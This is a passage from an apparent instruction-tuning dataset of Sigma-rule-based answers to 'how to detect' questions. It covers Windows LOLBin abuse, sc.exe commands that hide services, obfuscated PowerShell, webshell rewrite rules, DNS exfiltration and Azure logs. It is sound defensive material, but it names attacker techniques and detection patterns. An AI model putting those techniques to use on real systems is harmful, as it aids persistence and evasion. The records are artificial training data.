      "question": "suspicious network connections made by a well-known Windows binary run with no command line parameters",
      "answer": "In order to detect suspicious network connections made by a well-known Windows binary run with no command line parameters, you should monitor network connections from Windows systems for specific conditions. These include tracking connections initiated by the system where the process launching the connection ends with `\\regsvr32.exe`, `\\rundll32.exe`, or `\\dllhost.exe`. These executable files are legitimate Windows binaries but can be used maliciously to establish network connections.\n\nCriteria for detection include ensuring that the connection has been initiated (marked as 'true') and that the image or command line of the process initiating the connection ends with one of the mentioned executables. However, connections where these executables are run without any command line parameters should also be scrutinized. This is highlighted by filtering out instances where the command line parameter is either empty or null, suggesting that the executable was possibly invoked without any arguments, which is a common tactic used by attackers to avoid detection.\n\nGiven the high level of suspicion when these conditions are met, it is recommended to set the detection level to high due to the potential misuse of these Windows binaries in the facilitation of unauthorized network connections. Although some activities might be benign, leading to unknown false positives, the tags associated with this detection include tactics and techniques such as Execution, Persistence, Privilege Escalation, Defense Evasion, and potentially others directly related to the misuse of system utilities or binaries to achieve malicious objectives. \n\nThis method of detection is critical in identifying and mitigating threats that leverage legitimate system files for malicious network activities, thus enhancing the overall security posture against a variety of attack vectors."
    }
  },
  {
    "instruction": "How to detect: service account is modified or deleted.",
    "context": "",
    "output": "In order to identify when a service account is modified or deleted, you should monitor azure activity logs for specific operations related to Kubernetes service accounts. These operations include creating, deleting, and impersonating service accounts within Microsoft's Kubernetes service. The key operations to watch for are labeled as MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/WRITE, MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/DELETE, and MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/IMPERSONATE/ACTION. It's crucial to note that such modifications or deletions might be legitimate actions taken by system administrators. Therefore, any alerts generated should be carefully verified. This verification involves ensuring that the identification of the user, the user agent, and the hostname involved in the changes are authorized to perform such actions in your environment. In cases where modifications or deletions originate from unfamiliar users, these should be investigated promptly. Should you discover that known, legitimate behavior is triggering alerts, these can be configured to be exceptions to avoid false positives. This monitoring strategy is key to defending against tactics potentially involving privilege escalation or persistence, as unauthorized modifications to service accounts could grant attackers elevated access or the ability to maintain a foothold within the environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "service account is modified or deleted.",
      "answer": "In order to identify when a service account is modified or deleted, you should monitor azure activity logs for specific operations related to Kubernetes service accounts. These operations include creating, deleting, and impersonating service accounts within Microsoft's Kubernetes service. The key operations to watch for are labeled as MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/WRITE, MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/DELETE, and MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/IMPERSONATE/ACTION. It's crucial to note that such modifications or deletions might be legitimate actions taken by system administrators. Therefore, any alerts generated should be carefully verified. This verification involves ensuring that the identification of the user, the user agent, and the hostname involved in the changes are authorized to perform such actions in your environment. In cases where modifications or deletions originate from unfamiliar users, these should be investigated promptly. Should you discover that known, legitimate behavior is triggering alerts, these can be configured to be exceptions to avoid false positives. This monitoring strategy is key to defending against tactics potentially involving privilege escalation or persistence, as unauthorized modifications to service accounts could grant attackers elevated access or the ability to maintain a foothold within the environment."
    }
  },
  {
    "instruction": "How can I detect: suspicious user agent strings used by malware in proxy logs",
    "context": "",
    "output": "In order to detect suspicious user agent strings used by malware in proxy logs, you should: monitor proxy log sources for specific user agent strings that are commonly associated with various types of remote access tools (RATs), malware, and other potentially harmful software. These user agent strings include, but are not limited to, particular versions and formats masquerading as legitimate browsers, such as Internet Explorer, Mozilla Firefox, Chrome, and Safari, each of which might be an indicator of malicious activity. Certain strings are explicitly linked to known malware families like DragonOK, PlugX, HTTPBrowser RAT, and others including Emotet and Lockbit strains, as well as tools used for web shell interactions and other cyber threat activities. When these user agent strings are identified within the proxy logs, it indicates a high possibility of compromise or malicious attempt to communicate, signaling for further investigation. Detection involves capturing logs that contain these agent strings, alongside the requested URI and client IP address which can be critical for understanding the scope of a potential security breach or ongoing attack. Despite the specificity of the selection criteria, it's essential to remain aware of the small chance of false positives, where benign activities might inadvertently match the detection patterns.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious user agent strings used by malware in proxy logs",
      "answer": "In order to detect suspicious user agent strings used by malware in proxy logs, you should: monitor proxy log sources for specific user agent strings that are commonly associated with various types of remote access tools (RATs), malware, and other potentially harmful software. These user agent strings include, but are not limited to, particular versions and formats masquerading as legitimate browsers, such as Internet Explorer, Mozilla Firefox, Chrome, and Safari, each of which might be an indicator of malicious activity. Certain strings are explicitly linked to known malware families like DragonOK, PlugX, HTTPBrowser RAT, and others including Emotet and Lockbit strains, as well as tools used for web shell interactions and other cyber threat activities. When these user agent strings are identified within the proxy logs, it indicates a high possibility of compromise or malicious attempt to communicate, signaling for further investigation. Detection involves capturing logs that contain these agent strings, alongside the requested URI and client IP address which can be critical for understanding the scope of a potential security breach or ongoing attack. Despite the specificity of the selection criteria, it's essential to remain aware of the small chance of false positives, where benign activities might inadvertently match the detection patterns."
    }
  },
  {
    "instruction": "Please help me detect the following: possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client",
    "context": "",
    "output": "Sure!\nIn order to detect possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client, you should: Monitor Windows security event logs for Event ID 4649. This event signifies that a Kerberos ticket was presented more than once, which is a common indicator of a replay attack. It's important to note that this detection comes with a high level of importance due to the critical nature of the security event being monitored. Despite the possibility of unknown false positives, the high level suggests a strong emphasis on scrutinizing this event closely as it aligns with methods used in identity theft and defense evasion tactics.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client",
      "answer": "In order to detect possible Kerberos Replay Attack on the domain controllers when \"KRB_AP_ERR_REPEAT\" Kerberos response is sent to the client, you should: Monitor Windows security event logs for Event ID 4649. This event signifies that a Kerberos ticket was presented more than once, which is a common indicator of a replay attack. It's important to note that this detection comes with a high level of importance due to the critical nature of the security event being monitored. Despite the possibility of unknown false positives, the high level suggests a strong emphasis on scrutinizing this event closely as it aligns with methods used in identity theft and defense evasion tactics."
    }
  },
  {
    "instruction": "How can I detect: virtual network device is being modified or deleted.\nThis can be a network interface, network virtual appliance, virtual hub, or virtual router.\n",
    "context": "",
    "output": "In order to identify when a virtual network device is being modified or deleted, which can be a network interface, network virtual appliance, virtual hub, or virtual router, you should focus on monitoring activity within Microsoft Azure's Activity Logs. Specifically, observe for operations such as writing or deleting network interfaces, tap configurations on network interfaces, joining actions on network interfaces, and operations on network virtual appliances, virtual hubs, and virtual routers. These actions are critically indicative of modifications or deletions happening to virtual network devices.\n\nWhen these kinds of activities are detected, it's important to consider them with a medium level of suspicion. However, it's also crucial to differentiate between legitimate administrative actions and potentially malicious activities. Regular maintenance or system administration tasks might involve legitimate modifications or deletions of virtual network devices. Therefore, always verify the identity of the user making the changes, the user agent involved, and the hostname to ensure they are expected to interact with your Azure environment in this manner. \n\nActivities related to the specified operations that come from unfamiliar users or arise under unusual circumstances should be investigated further. If you establish that such behavior is benign and a known part of your environment's operations, you can exempt it from further alerts to avoid false positives.\n\nThis kind of monitoring is essential for protecting your Azure environment against unauthorized changes that could compromise network integrity and security. It aligns with recognized cybersecurity practices and tactics for detecting and responding to potential threats targeting cloud-based infrastructure.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "virtual network device is being modified or deleted.\nThis can be a network interface, network virtual appliance, virtual hub, or virtual router.\n",
      "answer": "In order to identify when a virtual network device is being modified or deleted, which can be a network interface, network virtual appliance, virtual hub, or virtual router, you should focus on monitoring activity within Microsoft Azure's Activity Logs. Specifically, observe for operations such as writing or deleting network interfaces, tap configurations on network interfaces, joining actions on network interfaces, and operations on network virtual appliances, virtual hubs, and virtual routers. These actions are critically indicative of modifications or deletions happening to virtual network devices.\n\nWhen these kinds of activities are detected, it's important to consider them with a medium level of suspicion. However, it's also crucial to differentiate between legitimate administrative actions and potentially malicious activities. Regular maintenance or system administration tasks might involve legitimate modifications or deletions of virtual network devices. Therefore, always verify the identity of the user making the changes, the user agent involved, and the hostname to ensure they are expected to interact with your Azure environment in this manner. \n\nActivities related to the specified operations that come from unfamiliar users or arise under unusual circumstances should be investigated further. If you establish that such behavior is benign and a known part of your environment's operations, you can exempt it from further alerts to avoid false positives.\n\nThis kind of monitoring is essential for protecting your Azure environment against unauthorized changes that could compromise network integrity and security. It aligns with recognized cybersecurity practices and tactics for detecting and responding to potential threats targeting cloud-based infrastructure."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect usage of the \"sc.exe\" utility adding a new service with special permissions seen used by threat actors which makes the service hidden and unremovable, you should: Focus on monitoring process creation events within Windows operating systems. Specifically, track the execution of the \"sc.exe\" utility, which is indicated either by the process image ending with '\\sc.exe' or the original file name being 'sc.exe'. Additionally, pay close attention to the command line arguments used with \"sc.exe\". Look for instances where \"sc.exe\" is commanded to modify service permissions in a suspicious manner which includes the use of 'sdset' along with a string of permissions that allow for actions like deleting all child objects, listing contents, writing all properties, deleting subtree, and direct deletion, represented as 'DCLCWPDTSD'. This combination of process execution and command line parameters is indicative of an attempt to create a hidden and unremovable service, aligning with tactics often used by attackers to maintain persistence and control over a victim's system. The detection of this activity is given a high level of concern due to its potential impact and the specific nature of the permissions being modified, which are not commonly used in legitimate scenarios.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.",
      "answer": "In order to detect usage of the \"sc.exe\" utility adding a new service with special permissions seen used by threat actors which makes the service hidden and unremovable, you should: Focus on monitoring process creation events within Windows operating systems. Specifically, track the execution of the \"sc.exe\" utility, which is indicated either by the process image ending with '\\sc.exe' or the original file name being 'sc.exe'. Additionally, pay close attention to the command line arguments used with \"sc.exe\". Look for instances where \"sc.exe\" is commanded to modify service permissions in a suspicious manner which includes the use of 'sdset' along with a string of permissions that allow for actions like deleting all child objects, listing contents, writing all properties, deleting subtree, and direct deletion, represented as 'DCLCWPDTSD'. This combination of process execution and command line parameters is indicative of an attempt to create a hidden and unremovable service, aligning with tactics often used by attackers to maintain persistence and control over a victim's system. The detection of this activity is given a high level of concern due to its potential impact and the specific nature of the permissions being modified, which are not commonly used in legitimate scenarios."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)",
    "context": "",
    "output": "Sure!\nIn order to detect a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell), you should: Monitor process creation events on Windows systems for the execution of cmd.exe with command line parameters that contain both 'http' (capturing both http and https URLs) and '%AppData%'. It is important to log both the command line that triggered the alert and the parent command line to investigate the context of the execution. Bear in mind that this kind of detection might result in a high number of false positives due to legitimate use of similar command line patterns. The relevance of this monitoring is rated at a medium level.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)",
      "answer": "In order to detect a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell), you should: Monitor process creation events on Windows systems for the execution of cmd.exe with command line parameters that contain both 'http' (capturing both http and https URLs) and '%AppData%'. It is important to log both the command line that triggered the alert and the parent command line to investigate the context of the execution. Bear in mind that this kind of detection might result in a high number of false positives due to legitimate use of similar command line patterns. The relevance of this monitoring is rated at a medium level."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Obfuscated Powershell via Stdin in Scripts",
    "context": "",
    "output": "In order to Detect Obfuscated Powershell via Stdin in Scripts, you should: Focus on monitoring Windows PowerShell scripts. Specifically, this involves tracking script block execution events, which is only possible if Script Block Logging is enabled. The detection criterion centers on identifying when a script block text includes, in any mix of upper or lower case, sequences of operations that are characteristic of obfuscation techniques. This typically involves the use of the 'set' command in conjunction with operations that modify the environment, invoke commands, or handle inputs in a way that suggests an attempt to conceal the script's true purpose. Any presence of such patterns, especially when 'set' commands are chained with environment or invocation modifications, should raise suspicion. These markers serve as indicators of potentially malicious obfuscated PowerShell code being executed through standard input mechanisms, which could be part of a larger, sophisticated attack effort. Given the nature of this detection strategy, any hits should be considered high-level threats, although due diligence should be exercised to verify the context, as false positives, though not specified, are always a possibility in dynamic execution environments. This approach aligns with recognizing tactics and techniques like the execution of obfuscated commands and scripts, which is a common strategy among adversaries to evade detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via Stdin in Scripts",
      "answer": "In order to Detect Obfuscated Powershell via Stdin in Scripts, you should: Focus on monitoring Windows PowerShell scripts. Specifically, this involves tracking script block execution events, which is only possible if Script Block Logging is enabled. The detection criterion centers on identifying when a script block text includes, in any mix of upper or lower case, sequences of operations that are characteristic of obfuscation techniques. This typically involves the use of the 'set' command in conjunction with operations that modify the environment, invoke commands, or handle inputs in a way that suggests an attempt to conceal the script's true purpose. Any presence of such patterns, especially when 'set' commands are chained with environment or invocation modifications, should raise suspicion. These markers serve as indicators of potentially malicious obfuscated PowerShell code being executed through standard input mechanisms, which could be part of a larger, sophisticated attack effort. Given the nature of this detection strategy, any hits should be considered high-level threats, although due diligence should be exercised to verify the context, as false positives, though not specified, are always a possibility in dynamic execution environments. This approach aligns with recognizing tactics and techniques like the execution of obfuscated commands and scripts, which is a common strategy among adversaries to evade detection."
    }
  },
  {
    "instruction": "How to detect: usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.",
    "context": "",
    "output": "In order to detect usage of \"appcmd\" to create new global URL rewrite rules, which has been observed being used by threat actors to add new rules so they can access their webshells, you should: Monitor Windows process creation logs for instances of the application \"appcmd.exe\" being executed, especially focusing on commands that include 'set', 'config', 'section:system.webServer/rewrite/globalRules', and 'commit:' in the command line. This behavior is indicative of attempts to modify web server configurations, potentially to insert malicious URL rewrite rules that could facilitate unsanctioned access to webshells. It is important to note, though, that there might be legitimate cases where administrators use \"appcmd.exe\" to add new URL rewrite rules for valid reasons, which are considered as possible false positives that need to be carefully evaluated. The severity of this activity is assessed as medium, suggesting a balanced approach to monitoring and investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.",
      "answer": "In order to detect usage of \"appcmd\" to create new global URL rewrite rules, which has been observed being used by threat actors to add new rules so they can access their webshells, you should: Monitor Windows process creation logs for instances of the application \"appcmd.exe\" being executed, especially focusing on commands that include 'set', 'config', 'section:system.webServer/rewrite/globalRules', and 'commit:' in the command line. This behavior is indicative of attempts to modify web server configurations, potentially to insert malicious URL rewrite rules that could facilitate unsanctioned access to webshells. It is important to note, though, that there might be legitimate cases where administrators use \"appcmd.exe\" to add new URL rewrite rules for valid reasons, which are considered as possible false positives that need to be carefully evaluated. The severity of this activity is assessed as medium, suggesting a balanced approach to monitoring and investigation."
    }
  },
  {
    "instruction": "Explain how should I detect the following: commandline containing reference to files ending with a \".\" This scheme has been seen used by raspberry-robin",
    "context": "",
    "output": "In order to detect commandline containing reference to files ending with a \".\", which has been seen used by raspberry-robin, you should monitor the creation of processes on Windows systems. Specifically, focus on the command lines that include references to files that end with a period followed by 1 to 6 characters but do not match at the end of the line due to potential false positives with bind DNS notation. This detection strategy is considered high priority due to the risk associated with the observed behavior.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "commandline containing reference to files ending with a \".\" This scheme has been seen used by raspberry-robin",
      "answer": "In order to detect commandline containing reference to files ending with a \".\", which has been seen used by raspberry-robin, you should monitor the creation of processes on Windows systems. Specifically, focus on the command lines that include references to files that end with a period followed by 1 to 6 characters but do not match at the end of the line due to potential false positives with bind DNS notation. This detection strategy is considered high priority due to the risk associated with the observed behavior."
    }
  },
  {
    "instruction": "How can I detect: volume shadow copy mount via Windows event log",
    "context": "",
    "output": "In order to detect volume shadow copy mount via Windows event log, you should monitor the Windows system log specifically for events generated by the Microsoft-Windows-Ntfs provider. Look for the event with ID 98, which indicates an activity related to the NTFS file system, such as when a volume shadow copy is mounted. This event becomes particularly significant if the DeviceName field in the event contains the string \"HarddiskVolumeShadowCopy,\" as this suggests a volume shadow copy operation was likely initiated.\n\nIt is important to note that there can be legitimate reasons for mounting volume shadow copies, such as during routine backups. Therefore, occurrences of this event may not always signify malicious activity. However, because attackers might exploit shadow copies to access or modify backups as part of their tactics, monitoring for this event can serve as an early warning. Mitigation techniques involve verifying the context in which these shadow copy mounts occur to determine if they are part of standard backup operations or if they deviate from normal patterns, suggesting a potential security threat.\n\nThe tags that are essential in understanding the context of this detection include Persistence, Privilege Escalation, and Defense Evasion, which correspond to tactics attackers might employ involving shadow copies to maintain access, elevate privileges, or evade defenses, respectively.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "volume shadow copy mount via Windows event log",
      "answer": "In order to detect volume shadow copy mount via Windows event log, you should monitor the Windows system log specifically for events generated by the Microsoft-Windows-Ntfs provider. Look for the event with ID 98, which indicates an activity related to the NTFS file system, such as when a volume shadow copy is mounted. This event becomes particularly significant if the DeviceName field in the event contains the string \"HarddiskVolumeShadowCopy,\" as this suggests a volume shadow copy operation was likely initiated.\n\nIt is important to note that there can be legitimate reasons for mounting volume shadow copies, such as during routine backups. Therefore, occurrences of this event may not always signify malicious activity. However, because attackers might exploit shadow copies to access or modify backups as part of their tactics, monitoring for this event can serve as an early warning. Mitigation techniques involve verifying the context in which these shadow copy mounts occur to determine if they are part of standard backup operations or if they deviate from normal patterns, suggesting a potential security threat.\n\nThe tags that are essential in understanding the context of this detection include Persistence, Privilege Escalation, and Defense Evasion, which correspond to tactics attackers might employ involving shadow copies to maintain access, elevate privileges, or evade defenses, respectively."
    }
  },
  {
    "instruction": "Explain how should I detect the following: loaded unsigned image on the system",
    "context": "",
    "output": "In order to detect loaded unsigned image on the system, you should: Monitor the Windows Code Integrity operational logs for events with an EventID of 3037. This specific EventID indicates that Code Integrity determined an unsigned image was loaded into the system. It suggests checking with the publisher to see if a signed version of the image is available. Given the nature of this activity, false positives are considered unlikely, and the severity of this detection is marked high. Monitoring for such occurrences helps in identifying potential unauthorized or malicious software executions that bypass standard security measures by not using a signed image.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "loaded unsigned image on the system",
      "answer": "In order to detect loaded unsigned image on the system, you should: Monitor the Windows Code Integrity operational logs for events with an EventID of 3037. This specific EventID indicates that Code Integrity determined an unsigned image was loaded into the system. It suggests checking with the publisher to see if a signed version of the image is available. Given the nature of this activity, false positives are considered unlikely, and the severity of this detection is marked high. Monitoring for such occurrences helps in identifying potential unauthorized or malicious software executions that bypass standard security measures by not using a signed image."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Obfuscated Powershell via use Clip.exe in Scripts",
    "context": "",
    "output": "In order to detect obfuscated PowerShell use via Clip.exe in scripts, you should focus on monitoring the creation of processes on Windows systems. Specifically, look for command line executions that simultaneously involve the use of \"echo\", \"clip\", and the logical operator \"&&\". These commands are peculiar because they are used to pass data through the clipboard using obfuscation techniques.\n\nThe detection mechanism becomes more refined by also identifying commands that contain a sequence of characters used to obfuscate the invocation of clipboard-related functionality or PowerShell scripting commands. These sequences include \"clipboard\", \"invoke\", or a broken-up version of \"invoke\" using backticks (i`) between characters, like \"i`n`v`o`k`e`\". This method aims to capture attempts where attackers use command-line obfuscation to evade detection while employing the clipboard for malicious PowerShell script execution.\n\nSuch behavior signals a high level of suspicion as it is uncommon in regular operations and is often associated with tactics and techniques like Execution, Defense Evasion, and potentially Command and Control. These are classic indicators of an attacker trying to execute commands or scripts in a way that hides their true nature, possibly downloading and executing malicious payloads or commands from the clipboard content, which was manipulated through seemingly benign utilities like Clip.exe.\n\nIt's essential to consider that while this detection strategy is crucial, it may occasionally encounter scenarios that are not inherently malicious (although such cases are expected to be rare). Thus, a high level of alert is justified when these patterns are observed, necessitating immediate investigation to rule out or confirm malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via use Clip.exe in Scripts",
      "answer": "In order to detect obfuscated PowerShell use via Clip.exe in scripts, you should focus on monitoring the creation of processes on Windows systems. Specifically, look for command line executions that simultaneously involve the use of \"echo\", \"clip\", and the logical operator \"&&\". These commands are peculiar because they are used to pass data through the clipboard using obfuscation techniques.\n\nThe detection mechanism becomes more refined by also identifying commands that contain a sequence of characters used to obfuscate the invocation of clipboard-related functionality or PowerShell scripting commands. These sequences include \"clipboard\", \"invoke\", or a broken-up version of \"invoke\" using backticks (i`) between characters, like \"i`n`v`o`k`e`\". This method aims to capture attempts where attackers use command-line obfuscation to evade detection while employing the clipboard for malicious PowerShell script execution.\n\nSuch behavior signals a high level of suspicion as it is uncommon in regular operations and is often associated with tactics and techniques like Execution, Defense Evasion, and potentially Command and Control. These are classic indicators of an attacker trying to execute commands or scripts in a way that hides their true nature, possibly downloading and executing malicious payloads or commands from the clipboard content, which was manipulated through seemingly benign utilities like Clip.exe.\n\nIt's essential to consider that while this detection strategy is crucial, it may occasionally encounter scenarios that are not inherently malicious (although such cases are expected to be rare). Thus, a high level of alert is justified when these patterns are observed, necessitating immediate investigation to rule out or confirm malicious activity."
    }
  },
  {
    "instruction": "How can I detect: execution of a Sysinternals Tool via the creation of the \"accepteula\" registry key",
    "context": "",
    "output": "In order to detect the execution of a Sysinternals Tool via the creation of the \"accepteula\" registry key, you should monitor the Windows Registry for events where a new key creation (CreateKey) is detected, specifically targeting keys that end with '\\EulaAccepted'. This activity is logged under the category of registry additions. While this behavior may indicate the usage of Sysinternals tools\u2014which require the acceptance of an End User License Agreement (EULA) before they run\u2014it's important to note that there may be legitimate instances of such activity. Programs other than Sysinternals tools might also use a registry key ending in '\\EulaAccepted', leading to possible false positives. Therefore, although this detection is set at a low level due to the potential for legitimate use cases, it remains a valuable indicator of specific tool execution that aligns with certain operating procedures or attack techniques.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of a Sysinternals Tool via the creation of the \"accepteula\" registry key",
      "answer": "In order to detect the execution of a Sysinternals Tool via the creation of the \"accepteula\" registry key, you should monitor the Windows Registry for events where a new key creation (CreateKey) is detected, specifically targeting keys that end with '\\EulaAccepted'. This activity is logged under the category of registry additions. While this behavior may indicate the usage of Sysinternals tools\u2014which require the acceptance of an End User License Agreement (EULA) before they run\u2014it's important to note that there may be legitimate instances of such activity. Programs other than Sysinternals tools might also use a registry key ending in '\\EulaAccepted', leading to possible false positives. Therefore, although this detection is set at a low level due to the potential for legitimate use cases, it remains a valuable indicator of specific tool execution that aligns with certain operating procedures or attack techniques."
    }
  },
  {
    "instruction": "Can you explain how to detect: High DNS queries bytes amount from host per short period of time",
    "context": "",
    "output": "Certainly!\n\nIn order to detect high DNS queries bytes amount from a host per short period of time, you should: Monitor DNS logs for any source IP address that generates a total sum of DNS query lengths exceeding 300,000 bytes within a timeframe of 1 minute. It's important to pay attention to any DNS activity that unusually uses a large amount of data in short intervals, as this could indicate a potential security threat. However, be mindful that there might be legitimate scenarios where high DNS bytes out rate to a domain name occurs, and such cases should be added to a whitelist to avoid false positives. This detection process is crucial for identifying possible data exfiltration or command and control communication attempts, linked to tactics and techniques such as Command and Control and Exfiltration. The severity level for this kind of activity is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "High DNS queries bytes amount from host per short period of time",
      "answer": "In order to detect high DNS queries bytes amount from a host per short period of time, you should: Monitor DNS logs for any source IP address that generates a total sum of DNS query lengths exceeding 300,000 bytes within a timeframe of 1 minute. It's important to pay attention to any DNS activity that unusually uses a large amount of data in short intervals, as this could indicate a potential security threat. However, be mindful that there might be legitimate scenarios where high DNS bytes out rate to a domain name occurs, and such cases should be added to a whitelist to avoid false positives. This detection process is crucial for identifying possible data exfiltration or command and control communication attempts, linked to tactics and techniques such as Command and Control and Exfiltration. The severity level for this kind of activity is considered medium."
    }
  },
  {
    "instruction": "Explain how should I detect the following: suspicious command execution (cmd) via Windows Management Instrumentation (WMI) on a remote host. This could be indicative of adversary lateral movement.",
    "context": "",
    "output": "In order to detect suspicious command execution (cmd) via Windows Management Instrumentation (WMI) on a remote host, which could be indicative of adversary lateral movement, you should: focus on monitoring the creation of processes on Windows systems. Specifically, keep an eye out for instances where the command prompt (cmd.exe) is launched as a process, and its parent process is the Windows Management Instrumentation Service Executable (WmiPrvSE.exe). This is a strong indicator of an attempt to execute commands remotely, often seen in the use of UNC paths (\\\\\\\\127.0.0.1\\\\) in the command line. Additionally, pay attention to command lines that contain redirection operators ('2>&1' or '1>'), as these are often used by adversaries to manage output and errors of remotely executed commands. The detection of such activities is considered to be of medium severity and should prompt further investigation, despite the potential for unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious command execution (cmd) via Windows Management Instrumentation (WMI) on a remote host. This could be indicative of adversary lateral movement.",
      "answer": "In order to detect suspicious command execution (cmd) via Windows Management Instrumentation (WMI) on a remote host, which could be indicative of adversary lateral movement, you should: focus on monitoring the creation of processes on Windows systems. Specifically, keep an eye out for instances where the command prompt (cmd.exe) is launched as a process, and its parent process is the Windows Management Instrumentation Service Executable (WmiPrvSE.exe). This is a strong indicator of an attempt to execute commands remotely, often seen in the use of UNC paths (\\\\\\\\127.0.0.1\\\\) in the command line. Additionally, pay attention to command lines that contain redirection operators ('2>&1' or '1>'), as these are often used by adversaries to manage output and errors of remotely executed commands. The detection of such activities is considered to be of medium severity and should prompt further investigation, despite the potential for unknown false positives."
    }
  },
  {
    "instruction": "How to detect: creation of a file named \"wpbbin\" in the \"%systemroot%\\system32\\\" directory. Which could be indicative of UEFI based persistence method",
    "context": "",
    "output": "In order to detect creation of a file named \"wpbbin\" in the \"%systemroot%\\system32\\\" directory, which could be indicative of UEFI based persistence method, you should: Monitor the Windows file event logs for any instances where a file named \"wpbbin.exe\" is created in the C:\\Windows\\System32 directory. This activity requires careful observation as it might suggest an attempt at establishing persistence on the system through UEFI manipulation. However, it's important to note that in some cases, this file creation could be a legitimate action performed by hardware manufacturers, such as Lenovo. The alert generated from this monitoring is considered high severity due to the potential for it being a part of a more complex attack strategy aiming at persistent access at a low system level.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a file named \"wpbbin\" in the \"%systemroot%\\system32\\\" directory. Which could be indicative of UEFI based persistence method",
      "answer": "In order to detect creation of a file named \"wpbbin\" in the \"%systemroot%\\system32\\\" directory, which could be indicative of UEFI based persistence method, you should: Monitor the Windows file event logs for any instances where a file named \"wpbbin.exe\" is created in the C:\\Windows\\System32 directory. This activity requires careful observation as it might suggest an attempt at establishing persistence on the system through UEFI manipulation. However, it's important to note that in some cases, this file creation could be a legitimate action performed by hardware manufacturers, such as Lenovo. The alert generated from this monitoring is considered high severity due to the potential for it being a part of a more complex attack strategy aiming at persistent access at a low system level."
    }
  },
  {
    "instruction": "Please help me detect the following: Detect DLL deletions from Spooler Service driver folder. This might be a potential exploitation attempt of CVE-2021-1675",
    "context": "",
    "output": "Sure!\nIn order to detect DLL deletions from Spooler Service driver folder, which might be a potential exploitation attempt of CVE-2021-1675, you should: Monitor for file deletion events on Windows systems, specifically focusing on the files within the \"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\\" directory. This is because an attack could involve deleting DLL files from this specific folder, a tactic that might be used in exploiting the mentioned vulnerability. The deletion events initiated by the process \"\\spoolsv.exe\" are of particular interest since this process is related to the Windows Print Spooler service, which is directly implicated in CVE-2021-1675. If such a deletion is detected, it should be considered suspicious and a potential indicator of an ongoing attack exploiting this vulnerability. The severity of this rule is set to high due to the potential impact of exploiting CVE-2021-1675.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect DLL deletions from Spooler Service driver folder. This might be a potential exploitation attempt of CVE-2021-1675",
      "answer": "In order to detect DLL deletions from Spooler Service driver folder, which might be a potential exploitation attempt of CVE-2021-1675, you should: Monitor for file deletion events on Windows systems, specifically focusing on the files within the \"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\\" directory. This is because an attack could involve deleting DLL files from this specific folder, a tactic that might be used in exploiting the mentioned vulnerability. The deletion events initiated by the process \"\\spoolsv.exe\" are of particular interest since this process is related to the Windows Print Spooler service, which is directly implicated in CVE-2021-1675. If such a deletion is detected, it should be considered suspicious and a potential indicator of an ongoing attack exploiting this vulnerability. The severity of this rule is set to high due to the potential impact of exploiting CVE-2021-1675."
    }
  },
  {
    "instruction": "Please help me detect the following: unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
    "context": "",
